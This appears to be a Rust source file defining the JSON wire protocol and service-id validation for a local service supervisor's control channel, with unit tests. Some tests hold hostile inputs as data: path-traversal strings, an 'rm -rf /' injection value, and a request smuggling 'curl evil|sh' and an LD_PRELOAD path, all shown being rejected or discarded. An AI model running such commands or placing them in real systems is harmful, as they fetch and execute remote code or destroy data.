// SPDX-License-Identifier: GPL-3.0-or-later
//! Wire types for the local control channel (spec `D5`).
//!
//! One bounded JSON request line in, one JSON response line out, connection
//! closed. Both directions carry the versioned envelope:
//!
//! ```text
//! {"schemaVersion":1,"command":"list"}
//! {"schemaVersion":1,"ok":true,"command":"list","result":{"kind":"services","services":[…]}}
//! {"schemaVersion":1,"ok":false,"command":"start","error":{"code":"unknownService","message":"…"}}
//! ```
//!
//! **Containment invariant (spec D6):** [`Request`] cannot express a path, an
//! argv, a pid, or an environment. The only thing a caller can name is a
//! [`ServiceId`], and `Supervisor::start` answers `NotFound` for anything
//! `stack.rs` did not already register — so a same-UID caller on this channel
//! cannot make the supervisor spawn a program of its choosing.

// The wire is platform-independent and stays compiled and unit-tested on
// every target, but its only *callers* today live behind `#[cfg(unix)]` (the
// server and the sync client). Keeping the types alive off unix is deliberate
// — a Windows-enablement slice should be wiring up a transport, not
// resurrecting a protocol — so silence dead-code there rather than cfg-gating
// the module and losing its tests on the platform that needs them next.
#![cfg_attr(not(unix), allow(dead_code))]

use std::fmt;

use serde::de::Error as _;
use serde::{Deserialize, Serialize};

use super::error::ControlError;
use crate::events::ServiceStatus;

/// Wire schema version. Within a major version fields are *added*, never
/// removed or retyped, and [`ErrorCode`] values are added, never repurposed.
/// Consumers must ignore unknown fields, must not rely on key order or on
/// human-readable messages, and must treat an unknown error code as a
/// generic failure.
pub const SCHEMA_VERSION: u32 = 1;

/// Longest accepted [`ServiceId`]. Real ids are `nginx`, `php-fpm-8.4`,
/// `mysql-8.4`; 64 bytes is generous headroom without letting an untrusted
/// peer stuff an unbounded string into a log line or an error message.
pub const MAX_SERVICE_ID_BYTES: usize = 64;

/// A registered service key — `nginx`, `php-fpm-8.4`, `mysql-8.4`.
///
/// Parse-don't-validate at ingress: the charset allowlist is
/// `[A-Za-z0-9._-]`, so a `ServiceId` provably contains no path separator, no
/// NUL, no shell metacharacter, no whitespace and no control character. It is
/// never a site domain and never a pid (spec D4).
///
/// This is a *charset* guard, not an authorization decision — whether the id
/// names a service that exists is `Supervisor`'s answer, not this type's.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct ServiceId(String);

impl ServiceId {
    /// Parse an untrusted string into a service id.
    ///
    /// Rejects: the empty string, anything over [`MAX_SERVICE_ID_BYTES`],
    /// any byte outside `[A-Za-z0-9._-]` (which covers `/`, `\`, NUL,
    /// whitespace, control characters and every non-ASCII byte), and the
    /// two path-component special cases `.` and `..` — the latter can never
    /// be a real service id and refusing it means no future caller can turn
    /// one into a directory traversal by using it as a path component.
    pub fn parse(raw: &str) -> Result<Self, ControlError> {
        if raw.is_empty() {
            return Err(ControlError::InvalidServiceId(
                "a service id must not be empty".into(),
            ));
        }
        if raw.len() > MAX_SERVICE_ID_BYTES {
            return Err(ControlError::InvalidServiceId(format!(
                "a service id must be at most {MAX_SERVICE_ID_BYTES} bytes, got {}",
                raw.len()
            )));
        }
        if raw == "." || raw == ".." {
            return Err(ControlError::InvalidServiceId(format!(
                "'{raw}' is a path component, not a service id"
            )));
        }
        if let Some(bad) = raw
            .chars()
            .find(|c| !(c.is_ascii_alphanumeric() || *c == '.' || *c == '-' || *c == '_'))
        {
            return Err(ControlError::InvalidServiceId(format!(
                "a service id may only contain [A-Za-z0-9._-]; found {bad:?}"
            )));
        }
        Ok(ServiceId(raw.to_owned()))
    }

    /// The id as a string slice.
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Consume the newtype, yielding the owned id.
    pub fn into_string(self) -> String {
        self.0
    }
}

impl fmt::Display for ServiceId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

impl Serialize for ServiceId {
    fn serialize<S: serde::Serializer>(&self, ser: S) -> Result<S::Ok, S::Error> {
        ser.serialize_str(&self.0)
    }
}

impl<'de> Deserialize<'de> for ServiceId {
    /// Deserialization routes through [`ServiceId::parse`], so a value that
    /// arrived over the wire has passed exactly the same allowlist as one
    /// built in-process. There is no way to construct a `ServiceId` that
    /// skipped the check.
    fn deserialize<D: serde::Deserializer<'de>>(de: D) -> Result<Self, D::Error> {
        let raw = String::deserialize(de)?;
        ServiceId::parse(&raw).map_err(D::Error::custom)
    }
}

/// `wait` defaults to `true`: the server waits for the terminal state unless
/// the caller explicitly opts out with `--no-wait` (spec D4).
fn wait_default() -> bool {
    true
}

/// One control verb. The `command` field is the serde tag.
///
/// See the module docs for the containment invariant: no variant carries a
/// path, an argv, a pid or an environment, by construction.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "command", rename_all = "camelCase")]
pub enum Request {
    /// Full status rows. `id: None` means every registered service.
    Status {
        /// Restrict to one service, or `None` for all of them.
        #[serde(default)]
        id: Option<ServiceId>,
    },
    /// The service table alone, id-sorted. Not a silent alias of `Status`.
    List,
    /// Start one service. With `wait`, the server responds once the service
    /// has reached a terminal state rather than once the transition is kicked
    /// off.
    Start {
        /// The service to start.
        id: ServiceId,
        /// Wait for the terminal state before responding.
        #[serde(default = "wait_default")]
        wait: bool,
    },
    /// Stop one service.
    Stop {
        /// The service to stop.
        id: ServiceId,
        /// Wait for the terminal state before responding.
        #[serde(default = "wait_default")]
        wait: bool,
    },
    /// Stop then start one service, sequenced server-side: the start half is
    /// not dispatched until the stop half is **observed** complete, so a
    /// client can never ask a service to start while it is still inside its
    /// stop grace.
    ///
    /// That is a sequencing guarantee, **not an exclusion one**. Per-service
    /// verbs deliberately take no lock (see `DesktopHandler`'s rule 3), so a
    /// tray click, an Apply, or another caller absolutely can act between the
    /// two halves; the second half then reports what it actually observed.
    Restart {
        /// The service to restart.
        id: ServiceId,
        /// Wait for the terminal state before responding.
        #[serde(default = "wait_default")]
        wait: bool,
    },
    /// Tear the whole stack down through the same bulk primitive the tray
    /// uses. Rejected rather than queued when a bulk operation is already in
    /// flight (spec D4).
    StopAll,
}

impl Request {
    /// The wire `command` string for this variant.
    ///
    /// Kept in lockstep with the serde tag by
    /// `command_name_matches_the_serde_tag_for_every_variant`, so the
    /// envelope's echoed `command` can never drift from what was actually
    /// parsed.
    pub fn command_name(&self) -> &'static str {
        match self {
            Request::Status { .. } => "status",
            Request::List => "list",
            Request::Start { .. } => "start",
            Request::Stop { .. } => "stop",
            Request::Restart { .. } => "restart",
            Request::StopAll => "stopAll",
        }
    }
}

/// Did the verb actually change anything? `Unchanged` is a success (exit 0),
/// mirroring `Supervisor::start`'s own early `Ok` when a service is already
/// running.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum Disposition {
    /// The service moved.
    Changed,
    /// The service was already in the target state.
    Unchanged,
}

/// Machine-readable failure classes. Values are added, never repurposed;
/// a consumer that meets an unknown one must treat it as a generic failure.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ErrorCode {
    /// No service is registered under that id.
    UnknownService,
    /// The app is not running, so there is no supervisor to talk to.
    SupervisorUnavailable,
    /// The app appears to be running but is not accepting control
    /// connections — it may still be starting.
    ControlChannelUnavailable,
    /// The verb ran and failed: the service reached `Failed`, or the bulk
    /// stop reported stragglers it could not clear.
    OperationFailed,
    /// A conflicting bulk operation is already in flight. Rejected, never
    /// queued.
    Busy,
    /// The transition did not reach a terminal state before the deadline.
    Timeout,
    /// The peer's uid is not ours.
    Unauthorized,
    /// The request was malformed, oversized, absent, or named an unknown
    /// command.
    BadRequest,
    /// The peer's `schemaVersion` is not one this build implements.
    UnsupportedVersion,
}

impl ErrorCode {
    /// The wire spelling of this code.
    ///
    /// Kept in lockstep with the serde rename by
    /// `error_code_as_str_matches_serde_for_every_variant`.
    pub fn as_str(&self) -> &'static str {
        match self {
            ErrorCode::UnknownService => "unknownService",
            ErrorCode::SupervisorUnavailable => "supervisorUnavailable",
            ErrorCode::ControlChannelUnavailable => "controlChannelUnavailable",
            ErrorCode::OperationFailed => "operationFailed",
            ErrorCode::Busy => "busy",
            ErrorCode::Timeout => "timeout",
            ErrorCode::Unauthorized => "unauthorized",
            ErrorCode::BadRequest => "badRequest",
            ErrorCode::UnsupportedVersion => "unsupportedVersion",
        }
    }
}

/// One control answer.
///
/// The service rows are [`ServiceStatus`] **verbatim** — the exact type and
/// serde shape the GUI already renders (`id`, `displayName`, `endpoint`,
/// `pid`, tagged `state` with `failed.exit` / `failed.stderrTail`). This is
/// deliberate reuse rather than a parallel DTO: the CLI and the GUI cannot
/// disagree about what a service is, and `Failed` carries the real stderr
/// through both surfaces (spec D5).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum Response {
    /// Answer to `List` / `Status`.
    Services {
        /// The service rows, id-sorted by the handler.
        services: Vec<ServiceStatus>,
    },
    /// Answer to `Start` / `Stop` / `Restart`.
    Transition {
        /// The service's row after the transition.
        service: ServiceStatus,
        /// Whether anything actually moved.
        disposition: Disposition,
    },
    /// Answer to `StopAll`.
    StopAll {
        /// Ids that did not stop within the bulk deadline.
        stragglers: Vec<String>,
    },
    /// Any failure. Carried in the envelope's `error` field with `ok:false`,
    /// never in `result`.
    Error {
        /// Machine-readable class.
        code: ErrorCode,
        /// Human-readable detail. Never parse this.
        message: String,
    },
}

impl Response {
    /// Convenience constructor for an error answer.
    pub fn error(code: ErrorCode, message: impl Into<String>) -> Self {
        Response::Error {
            code,
            message: message.into(),
        }
    }
}

/// A request that could not be turned into a [`Request`], carrying enough to
/// answer with a *typed* error instead of silently dropping the connection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Rejection {
    /// The peer's `command` if it was a string, else `"unknown"` — echoed in
    /// the envelope so a `jq` pipeline still learns which verb failed.
    pub(crate) command: String,
    pub(crate) code: ErrorCode,
    pub(crate) message: String,
}

/// `command` used when the peer did not send a usable one.
pub(crate) const UNKNOWN_COMMAND: &str = "unknown";

/// Serialize one request as a single line (no trailing newline).
pub(crate) fn encode_request(req: &Request) -> Result<String, ControlError> {
    #[derive(Serialize)]
    #[serde(rename_all = "camelCase")]
    struct Envelope<'a> {
        schema_version: u32,
        #[serde(flatten)]
        request: &'a Request,
    }
    serde_json::to_string(&Envelope {
        schema_version: SCHEMA_VERSION,
        request: req,
    })
    .map_err(|e| ControlError::Protocol(format!("could not encode the request: {e}")))
}

/// Parse an untrusted request line.
///
/// Two-stage on purpose: the `schemaVersion` gate and the unknown-command
/// case must each produce a *typed* [`Rejection`] the server can answer with,
/// never a silent no-op and never an opaque serde string. Safe to run on
/// attacker-controlled bytes because the caller has already capped them at
/// [`MAX_REQUEST_BYTES`](super::MAX_REQUEST_BYTES).
pub(crate) fn decode_request(bytes: &[u8]) -> Result<Request, Rejection> {
    let reject = |command: &str, code, message: String| Rejection {
        command: command.to_owned(),
        code,
        message,
    };
    if bytes.is_empty() {
        return Err(reject(
            UNKNOWN_COMMAND,
            ErrorCode::BadRequest,
            "no request was sent".into(),
        ));
    }
    let mut value: serde_json::Value = serde_json::from_slice(bytes).map_err(|e| {
        reject(
            UNKNOWN_COMMAND,
            ErrorCode::BadRequest,
            format!("the request was not valid JSON: {e}"),
        )
    })?;
    let obj = value.as_object_mut().ok_or_else(|| {
        reject(
            UNKNOWN_COMMAND,
            ErrorCode::BadRequest,
            "the request must be a JSON object".into(),
        )
    })?;
    // Echo whatever the peer called this, even when everything else about the
    // request is wrong.
    let command = obj
        .get("command")
        .and_then(serde_json::Value::as_str)
        .unwrap_or(UNKNOWN_COMMAND)
        .to_owned();
    match obj.remove("schemaVersion").and_then(|v| v.as_u64()) {
        Some(v) if v == u64::from(SCHEMA_VERSION) => {}
        Some(v) => {
            return Err(reject(
                &command,
                ErrorCode::UnsupportedVersion,
                format!("schemaVersion {v} is not supported; this build speaks {SCHEMA_VERSION}"),
            ));
        }
        None => {
            return Err(reject(
                &command,
                ErrorCode::UnsupportedVersion,
                format!(
                    "the request is missing an integer schemaVersion (expected {SCHEMA_VERSION})"
                ),
            ));
        }
    }
    serde_json::from_value(value).map_err(|e| {
        reject(
            &command,
            ErrorCode::BadRequest,
            format!("the request could not be understood: {e}"),
        )
    })
}

/// Build the response envelope for `command`.
///
/// Public so the CLI renders exactly the bytes the server would have sent,
/// including for answers it has to synthesize itself (no app running). Two
/// surfaces, one envelope builder — they cannot drift.
pub fn envelope_json(command: &str, response: &Response) -> serde_json::Value {
    match response {
        Response::Error { code, message } => serde_json::json!({
            "schemaVersion": SCHEMA_VERSION,
            "ok": false,
            "command": command,
            "error": { "code": code.as_str(), "message": message },
        }),
        Response::Services { .. } | Response::Transition { .. } | Response::StopAll { .. } => {
            match serde_json::to_value(response) {
                Ok(result) => serde_json::json!({
                    "schemaVersion": SCHEMA_VERSION,
                    "ok": true,
                    "command": command,
                    "result": result,
                }),
                // Unreachable for these variants (no failing `Serialize` impl
                // in the graph), but degrading to a typed error envelope beats
                // an `unwrap` on a path a hostile peer can reach.
                Err(e) => envelope_json(
                    command,
                    &Response::error(
                        ErrorCode::OperationFailed,
                        format!("could not encode the response: {e}"),
                    ),
                ),
            }
        }
    }
}

/// Parse a response line received from the server.
pub(crate) fn decode_response(bytes: &[u8]) -> Result<Response, ControlError> {
    if bytes.is_empty() {
        return Err(ControlError::Protocol(
            "the server closed the connection without answering".into(),
        ));
    }
    let value: serde_json::Value = serde_json::from_slice(bytes)
        .map_err(|e| ControlError::Protocol(format!("the response was not valid JSON: {e}")))?;
    match value
        .get("schemaVersion")
        .and_then(serde_json::Value::as_u64)
    {
        Some(v) if v == u64::from(SCHEMA_VERSION) => {}
        Some(v) => {
            return Err(ControlError::Protocol(format!(
                "the server speaks schemaVersion {v}; this build speaks {SCHEMA_VERSION}"
            )));
        }
        None => {
            return Err(ControlError::Protocol(
                "the response is missing an integer schemaVersion".into(),
            ));
        }
    }
    let ok = value
        .get("ok")
        .and_then(serde_json::Value::as_bool)
        .ok_or_else(|| ControlError::Protocol("the response is missing a boolean ok".into()))?;
    if ok {
        let result = value
            .get("result")
            .ok_or_else(|| ControlError::Protocol("the response is missing result".into()))?;
        serde_json::from_value(result.clone()).map_err(|e| {
            ControlError::Protocol(format!("the response result is not one of ours: {e}"))
        })
    } else {
        let error = value
            .get("error")
            .ok_or_else(|| ControlError::Protocol("the response is missing error".into()))?;
        let message = error
            .get("message")
            .and_then(serde_json::Value::as_str)
            .unwrap_or("the server reported a failure with no message")
            .to_owned();
        // An unknown code from a newer server degrades to a generic failure
        // rather than becoming a protocol violation — the documented
        // stability contract is "treat an unknown code as a generic failure",
        // and an old CLI meeting a new code must still print the message and
        // exit non-zero.
        let code = error
            .get("code")
            .cloned()
            .and_then(|c| serde_json::from_value::<ErrorCode>(c).ok())
            .unwrap_or(ErrorCode::OperationFailed);
        Ok(Response::Error { code, message })
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use crate::events::ServiceState;

    fn id(s: &str) -> ServiceId {
        ServiceId::parse(s).unwrap()
    }

    fn status(id: &str, state: ServiceState) -> ServiceStatus {
        ServiceStatus {
            id: id.into(),
            display_name: "Nginx".into(),
            endpoint: Some("http://127.0.0.1:80".into()),
            pid: Some(4242),
            state,
        }
    }

    /// Every variant, so a new one cannot be added without appearing here.
    fn every_request() -> Vec<Request> {
        vec![
            Request::Status { id: None },
            Request::Status {
                id: Some(id("nginx")),
            },
            Request::List,
            Request::Start {
                id: id("php-fpm-8.4"),
                wait: true,
            },
            Request::Stop {
                id: id("mysql-8.4"),
                wait: false,
            },
            Request::Restart {
                id: id("nginx"),
                wait: true,
            },
            Request::StopAll,
        ]
    }

    fn every_response() -> Vec<Response> {
        vec![
            Response::Services {
                services: vec![status("nginx", ServiceState::Running)],
            },
            Response::Transition {
                service: status("nginx", ServiceState::Running),
                disposition: Disposition::Changed,
            },
            Response::Transition {
                service: status(
                    "php-fpm-8.4",
                    ServiceState::Failed {
                        exit: Some(78),
                        stderr_tail: vec!["ERROR: unable to bind listening socket".into()],
                    },
                ),
                disposition: Disposition::Unchanged,
            },
            Response::StopAll {
                stragglers: vec!["mysql-8.4".into()],
            },
            Response::error(ErrorCode::UnknownService, "no service 'nope'"),
        ]
    }

    // ---- ServiceId -------------------------------------------------------

    #[test]
    fn service_id_accepts_the_ids_the_stack_actually_registers() {
        for good in ["nginx", "php-fpm-8.4", "mysql-8.4", "demo_ticker", "a"] {
            assert_eq!(ServiceId::parse(good).unwrap().as_str(), good);
        }
    }

    #[test]
    fn service_id_rejects_empty_oversized_and_path_shaped_input() {
        let too_long = "n".repeat(MAX_SERVICE_ID_BYTES + 1);
        for bad in [
            "",
            too_long.as_str(),
            ".",
            "..",
            "../../etc/passwd",
            "/etc/passwd",
            "nginx/../mysql",
            "C:\\windows",
            "ngin x",
            "nginx\n",
            "nginx\0",
            "nginx;rm -rf /",
            "ng$inx",
            "服务",
        ] {
            match ServiceId::parse(bad) {
                Err(ControlError::InvalidServiceId(_)) => {}
                other => panic!("{bad:?} must be rejected, got {other:?}"),
            }
        }
    }

    #[test]
    fn service_id_accepts_exactly_the_maximum_length() {
        let at_limit = "n".repeat(MAX_SERVICE_ID_BYTES);
        assert!(ServiceId::parse(&at_limit).is_ok());
    }

    #[test]
    fn service_id_deserialization_goes_through_parse() {
        // The only way a ServiceId can exist is via `parse`, so the wire
        // cannot smuggle one past the allowlist.
        let err = serde_json::from_str::<ServiceId>("\"../../etc\"").unwrap_err();
        assert!(err.to_string().contains("service id"), "{err}");
    }

    // ---- Request round trip ---------------------------------------------

    #[test]
    fn every_request_variant_round_trips() {
        for req in every_request() {
            let line = encode_request(&req).unwrap();
            let back = decode_request(line.as_bytes())
                .unwrap_or_else(|r| panic!("{line} rejected: {r:?}"));
            assert_eq!(back, req, "round trip changed {line}");
        }
    }

    #[test]
    fn encoded_requests_carry_the_schema_version_and_command() {
        for req in every_request() {
            let line = encode_request(&req).unwrap();
            let v: serde_json::Value = serde_json::from_str(&line).unwrap();
            assert_eq!(v["schemaVersion"], SCHEMA_VERSION);
            assert_eq!(v["command"], req.command_name());
            assert!(!line.contains('\n'), "a request must be one line: {line}");
        }
    }

    #[test]
    fn command_name_matches_the_serde_tag_for_every_variant() {
        for req in every_request() {
            let v = serde_json::to_value(&req).unwrap();
            assert_eq!(
                v["command"],
                serde_json::Value::from(req.command_name()),
                "command_name drifted from the serde tag for {req:?}"
            );
        }
    }

    #[test]
    fn wait_defaults_to_true_when_the_peer_omits_it() {
        let req = decode_request(br#"{"schemaVersion":1,"command":"start","id":"nginx"}"#).unwrap();
        assert_eq!(
            req,
            Request::Start {
                id: id("nginx"),
                wait: true
            }
        );
    }

    #[test]
    fn status_id_defaults_to_none_when_the_peer_omits_it() {
        let req = decode_request(br#"{"schemaVersion":1,"command":"status"}"#).unwrap();
        assert_eq!(req, Request::Status { id: None });
    }

    // ---- Typed rejections ------------------------------------------------

    #[test]
    fn an_unknown_command_is_a_typed_bad_request_that_echoes_the_command() {
        let rejection =
            decode_request(br#"{"schemaVersion":1,"command":"frobnicate"}"#).unwrap_err();
        assert_eq!(rejection.code, ErrorCode::BadRequest);
        assert_eq!(rejection.command, "frobnicate");
        assert!(!rejection.message.is_empty());
    }

    #[test]
    fn an_unsupported_schema_version_is_a_typed_error_not_a_silent_no_op() {
        let rejection = decode_request(br#"{"schemaVersion":99,"command":"list"}"#).unwrap_err();
        assert_eq!(rejection.code, ErrorCode::UnsupportedVersion);
        assert_eq!(rejection.command, "list");
        assert!(rejection.message.contains("99"), "{}", rejection.message);
    }

    #[test]
    fn a_missing_schema_version_is_refused() {
        let rejection = decode_request(br#"{"command":"list"}"#).unwrap_err();
        assert_eq!(rejection.code, ErrorCode::UnsupportedVersion);
        assert_eq!(rejection.command, "list");
    }

    #[test]
    fn a_non_integer_schema_version_is_refused() {
        let rejection = decode_request(br#"{"schemaVersion":"1","command":"list"}"#).unwrap_err();
        assert_eq!(rejection.code, ErrorCode::UnsupportedVersion);
    }

    #[test]
    fn malformed_input_is_refused_with_an_unknown_command() {
        for (raw, label) in [
            (&b""[..], "empty"),
            (&b"not json"[..], "not json"),
            (&b"[1,2,3]"[..], "not an object"),
            (&b"\"a string\""[..], "not an object"),
        ] {
            let rejection = decode_request(raw).unwrap_err();
            assert_eq!(rejection.code, ErrorCode::BadRequest, "{label}");
            assert_eq!(rejection.command, UNKNOWN_COMMAND, "{label}");
        }
    }

    #[test]
    fn a_bad_service_id_on_the_wire_is_a_bad_request_not_a_parsed_request() {
        let rejection =
            decode_request(br#"{"schemaVersion":1,"command":"start","id":"../../bin/sh"}"#)
                .unwrap_err();
        assert_eq!(rejection.code, ErrorCode::BadRequest);
        assert_eq!(rejection.command, "start");
    }

    /// The containment invariant, exercised from the wire rather than
    /// asserted in prose: a peer can put whatever it likes in the JSON, and
    /// none of it survives into the parsed request. There is nowhere for a
    /// path, an argv, a pid or an environment to land.
    #[test]
    fn extra_wire_fields_cannot_smuggle_a_path_argv_or_pid() {
        let hostile = br#"{"schemaVersion":1,"command":"start","id":"nginx","wait":false,
            "argv":["/bin/sh","-c","curl evil|sh"],"path":"/bin/sh","pid":1,
            "cwd":"/","env":{"LD_PRELOAD":"/tmp/x.so"},"program":"/bin/sh"}"#;
        let req = decode_request(hostile).unwrap();
        assert_eq!(
            req,
            Request::Start {
                id: id("nginx"),
                wait: false
            }
        );
        // Belt and braces: nothing hostile survives re-encoding either.
        let re_encoded = encode_request(&req).unwrap();
        for smuggled in ["argv", "/bin/sh", "LD_PRELOAD", "cwd", "program", "pid"] {
            assert!(
                !re_encoded.contains(smuggled),
                "{smuggled} survived into {re_encoded}"
            );
        }
    }

    // ---- Envelope --------------------------------------------------------

    #[test]
    fn success_envelopes_are_ok_true_with_a_result_and_no_error() {
        for resp in every_response() {
            if matches!(resp, Response::Error { .. }) {
                continue;
            }
            let v = envelope_json("list", &resp);
            assert_eq!(v["schemaVersion"], SCHEMA_VERSION);
            assert_eq!(v["ok"], true);
            assert_eq!(v["command"], "list");
            assert!(v.get("result").is_some(), "{v}");
            assert!(v.get("error").is_none(), "{v}");
        }
    }

    #[test]
    fn error_envelopes_are_ok_false_with_an_error_and_no_result() {
        let v = envelope_json(
            "start",
            &Response::error(ErrorCode::UnknownService, "no service 'nope'"),
        );
        assert_eq!(
            v,
            serde_json::json!({
                "schemaVersion": 1,
                "ok": false,
                "command": "start",
                "error": { "code": "unknownService", "message": "no service 'nope'" },
            })
        );
    }

    #[test]
    fn every_response_variant_round_trips_through_the_envelope() {
        for resp in every_response() {
            let line = envelope_json("status", &resp).to_string();
            let back =
                decode_response(line.as_bytes()).unwrap_or_else(|e| panic!("{line} rejected: {e}"));
            assert_eq!(back, resp, "round trip changed {line}");
        }
    }

    #[test]
    fn the_envelope_is_a_single_line() {
        for resp in every_response() {
            let line = envelope_json("list", &resp).to_string();
            assert!(!line.contains('\n'), "{line}");
        }
    }

    /// The highest-leverage reuse decision in the slice (spec D5): the CLI
    /// and the GUI must not be able to disagree about what a service is, so
    /// the rows on the wire are `ServiceStatus`'s existing serde shape
    /// verbatim — camelCase keys, tagged state, real stderr.
    #[test]
    fn service_rows_keep_service_status_serde_shape_verbatim() {
        let resp = Response::Services {
            services: vec![status(
                "php-fpm-8.4",
                ServiceState::Failed {
                    exit: Some(78),
                    stderr_tail: vec!["ERROR: unable to bind".into()],
                },
            )],
        };
        let v = envelope_json("list", &resp);
        let row = &v["result"]["services"][0];
        assert_eq!(row["id"], "php-fpm-8.4");
        assert_eq!(row["displayName"], "Nginx");
        assert_eq!(row["endpoint"], "http://127.0.0.1:80");
        assert_eq!(row["pid"], 4242);
        assert_eq!(row["state"]["kind"], "failed");
        assert_eq!(row["state"]["exit"], 78);
        assert_eq!(row["state"]["stderrTail"][0], "ERROR: unable to bind");
        // And it is byte-identical to what the GUI's own event carries.
        assert_eq!(
            row,
            &serde_json::to_value(status(
                "php-fpm-8.4",
                ServiceState::Failed {
                    exit: Some(78),
                    stderr_tail: vec!["ERROR: unable to bind".into()],
                },
            ))
            .unwrap()
        );
    }

    #[test]
    fn transition_envelopes_name_their_disposition() {
        let v = envelope_json(
            "start",
            &Response::Transition {
                service: status("nginx", ServiceState::Running),
                disposition: Disposition::Unchanged,
            },
        );
        assert_eq!(v["result"]["kind"], "transition");
        assert_eq!(v["result"]["disposition"], "unchanged");
        assert_eq!(v["result"]["service"]["state"]["kind"], "running");
    }

    #[test]
    fn stop_all_envelopes_carry_their_stragglers() {
        let v = envelope_json(
            "stopAll",
            &Response::StopAll {
                stragglers: vec!["mysql-8.4".into()],
            },
        );
        assert_eq!(v["result"]["kind"], "stopAll");
        assert_eq!(v["result"]["stragglers"][0], "mysql-8.4");
    }

    // ---- ErrorCode -------------------------------------------------------

    #[test]
    fn error_code_as_str_matches_serde_for_every_variant() {
        for code in [
            ErrorCode::UnknownService,
            ErrorCode::SupervisorUnavailable,
            ErrorCode::ControlChannelUnavailable,
            ErrorCode::OperationFailed,
            ErrorCode::Busy,
            ErrorCode::Timeout,
            ErrorCode::Unauthorized,
            ErrorCode::BadRequest,
            ErrorCode::UnsupportedVersion,
        ] {
            assert_eq!(
                serde_json::to_value(code).unwrap(),
                serde_json::Value::from(code.as_str()),
                "as_str drifted from serde for {code:?}"
            );
            // And it survives a full envelope round trip under that spelling.
            let line = envelope_json("list", &Response::error(code, "m")).to_string();
            assert_eq!(
                decode_response(line.as_bytes()).unwrap(),
                Response::Error {
                    code,
                    message: "m".into()
                }
            );
        }
    }

    /// Documented stability contract: a consumer must treat an unknown code
    /// as a generic failure. An older CLI meeting a newer server must still
    /// print the message and exit non-zero, not die on the envelope.
    #[test]
    fn an_unknown_error_code_degrades_to_a_generic_failure() {
        let line = br#"{"schemaVersion":1,"ok":false,"command":"start",
            "error":{"code":"somethingFromTheFuture","message":"the real reason"}}"#;
        assert_eq!(
            decode_response(line).unwrap(),
            Response::Error {
                code: ErrorCode::OperationFailed,
                message: "the real reason".into()
            }
        );
    }

    // ---- Response decoding failures --------------------------------------

    #[test]
    fn decode_response_refuses_a_foreign_schema_version() {
        let line = br#"{"schemaVersion":2,"ok":true,"command":"list","result":{"kind":"services","services":[]}}"#;
        match decode_response(line) {
            Err(ControlError::Protocol(m)) => assert!(m.contains('2'), "{m}"),
            other => panic!("expected Protocol, got {other:?}"),
        }
    }

    #[test]
    fn decode_response_refuses_a_truncated_or_empty_answer() {
        for raw in [&b""[..], &b"{\"schemaVersion\":1}"[..], &b"{"[..]] {
            assert!(
                matches!(decode_response(raw), Err(ControlError::Protocol(_))),
                "{raw:?} must be a protocol violation"
            );
        }
    }

    #[test]
    fn decode_response_refuses_a_result_that_is_not_one_of_ours() {
        let line =
            br#"{"schemaVersion":1,"ok":true,"command":"list","result":{"kind":"whatever"}}"#;
        assert!(matches!(
            decode_response(line),
            Err(ControlError::Protocol(_))
        ));
    }

    #[test]
    fn decode_response_survives_an_error_body_with_no_message() {
        let line = br#"{"schemaVersion":1,"ok":false,"command":"list","error":{"code":"busy"}}"#;
        match decode_response(line).unwrap() {
            Response::Error { code, message } => {
                assert_eq!(code, ErrorCode::Busy);
                assert!(!message.is_empty());
            }
            other => panic!("expected an Error response, got {other:?}"),
        }
    }
}
